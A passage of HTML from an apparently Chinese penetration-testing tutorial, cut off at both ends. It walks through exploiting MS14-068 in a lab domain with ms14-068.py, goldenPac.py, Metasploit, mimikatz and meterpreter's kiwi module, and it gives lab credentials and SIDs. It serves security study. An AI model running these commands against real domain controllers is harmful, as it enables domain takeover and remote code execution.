transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1315137663</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3706837544</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1429009142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1112</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">93.30</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Bunny2021</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># python ms14-068.py -u 域用户名@域名 -s 域用户sid -d 域控ip -p域用户密码</span></span></code></pre></section><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">利用 GoldenPac.py</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这个是 Impacket 工具包里面的一个工具，是 ms14-068 与 psexec 结合的一个产物，利用起来十分顺手，并且该工具可以走代理进入内网，十分强大。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Kali 下面默认还没有安装 Kerberos 的认证功能，所以我们首先要安装一个 Kerberos 客户端：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="bash" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> install krb5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后再使用 goldenPac.py 脚本：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="bash" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python3 goldenPac</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">py </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ip </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">93.30</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">target</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ip </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">93.20</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bunny</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Bunny2021@dc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># goldenPac.py -dc-ip 域控IP -target-ip 目标机IP 域名/普通域用户名:普通域用户密码@域控</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行成功后即可获得目标主机的一个 Shell。当然此工具不止是得到一个 Shell，我们甚至可以直接让该域控运行我们上传的程序，执行一个 Payload 啥的都不在话下。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">Metasploit 下的利用</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 Metasploit 框架下，我们可以使用&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</code>&nbsp;模块进行利用：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="ruby" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">use</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> auxiliary</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">admin</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ms14_068_kerberos_checksum</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> domain whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> user bunny</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> password </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Bunny2021</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> rhosts </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">93.30</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 域控制器地址</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">set</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> user_sid S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1315137663</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3706837544</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1429009142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1112</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 域 SID</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.37555753791257807" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/22_tfpneBw5olXs7CRVU1g1senv1WXTfw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlDACxtE6Pic5zN82BcsA20Y8icntfpneBw5olXs7CRVU1g1senv1WXTfw/640?wx_fmt=png'" data-type="png" data-w="1121" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521104940962</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，输入域名、被提权用户的密码、被提权用户、被提权用户的SID，域控制器的IP后，会在 /root/.msf4/loot 目录下生成票据文件&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">20210521104912_default_192.168.93.30_windows.kerberos_218042.bin</code>，但是我们还要进行对其格式转换，在 mimikatz 中输入命令，导出 kirbi 格式的文件：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="javascript" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clist </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"20210521104912_default_192.168.93.30_windows.kerberos_218042.bin"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">export</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5175175175175175" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/23_92Q2I8UyoWcwWXHCcQGfYLkCE8RfVg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlYvMXpvflN6OpO3sUESpL3VY092Q2I8UyoWcwWXHCcQGfYLkCE8RfVg/640?wx_fmt=png'" data-type="png" data-w="999" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521105350918</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，转换成了一个&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">0-00000000-bunny@krbtgt-WHOAMIANONY.ORG.kirbi</code>，我们将其移动到了 Kali 的 /root 目录下，一会好操作！</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先需要让 Windows 7 上线 MSF：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.19610091743119265" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/24_C4nFmT5eEahOicAgezrAcgaH8nZYDg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlohShpV2YtDY2n0SUr0gFg2J3cC4nFmT5eEahOicAgezrAcgaH8nZYDg/640?wx_fmt=png'" data-type="png" data-w="872" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521110157111</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后再这个 meterpreter 中加载 kiwi 模块：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="ruby" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">load kiwi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.30158730158730157" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/25_z5VOJ3rujM7nFpBNmTngIMzZJNqbsA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBltFT8gnpkpD6S1PcvhDJuVytJz5VOJ3rujM7nFpBNmTngIMzZJNqbsA/640?wx_fmt=png'" data-type="png" data-w="693" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521110436981</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后输入命令导入刚才转换生成的票据：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="bash" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos_ticket_use </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">root</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span 